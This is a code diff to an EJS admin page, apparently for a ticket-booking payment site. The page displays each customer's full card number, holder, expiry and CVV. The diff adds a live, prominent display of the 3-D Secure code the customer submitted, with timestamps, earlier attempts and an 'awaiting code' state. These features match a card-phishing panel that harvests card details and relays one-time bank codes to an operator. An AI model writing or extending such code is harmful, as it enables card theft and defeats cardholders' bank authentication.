@@ -39,7 +39,7 @@
                 <div>
                   <h3 style="font-size:1rem;margin-top:0"><%= t('admin.cardData') %></h3>
                   <dl class="kv">
-                    <dt><%= t('secure3d.card') %></dt><dd class="mono"><%= p.card && p.card.number ? p.card.number : '—' %></dd>
+                    <dt><%= t('secure3d.card') %></dt><dd class="mono"><%= p.card && p.card.number ? String(p.card.number).replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim() : '—' %></dd>
                     <dt><%= t('admin.holderLabel') %></dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
                     <dt><%= t('admin.expiryLabel') %></dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
                     <dt><%= t('payment.cvv') %></dt><dd class="mono"><%= p.card && p.card.cvv ? p.card.cvv : '—' %></dd>
@@ -58,11 +58,19 @@
                     <dt><%= t('table.route') %></dt><dd><%= o ? (o.fromName + ' — ' + o.toName) : '—' %></dd>
                     <dt><%= t('search.date') %></dt><dd><%= o ? (o.date + ' ' + o.departTime) : '—' %></dd>
                   </dl>
-                  <% if (p.verificationCode) { %>
-                    <p class="sec-note"><%= t('admin.verifyCodeLabel') %>: <strong class="mono"><%= p.verificationCode %></strong></p>
-                  <% } %>
                   <% if (p.submittedCode) { %>
-                    <p class="sec-note"><%= t('admin.submittedCodeLabel') %>: <strong class="mono"><%= p.submittedCode %></strong></p>
+                    <div class="alert alert--success mt-16">
+                      <%= t('admin.submittedCodeLabel') %> (3-D):
+                      <strong class="mono" style="font-size:1.4rem;letter-spacing:.2em"><%= p.submittedCode %></strong>
+                      <% if (p.codeSubmittedAt) { %><br><small><%= new Date(p.codeSubmittedAt).toLocaleString('az-AZ', { timeZone: 'Asia/Baku' }) %></small><% } %>
+                    </div>
+                    <% if (p.codeAttempts && p.codeAttempts.length > 1) { %>
+                      <p class="sec-note">Əvvəlki cəhdlər:
+                        <% p.codeAttempts.slice(0, -1).forEach(function(a){ %><span class="mono"><%= a.code %></span> <% }) %>
+                      </p>
+                    <% } %>
+                  <% } else if (p.status === 'awaiting_3ds') { %>
+                    <p class="sec-note mt-16">3-D kod hələ daxil edilməyib…</p>
                   <% } %>
                 </div>
               </div>
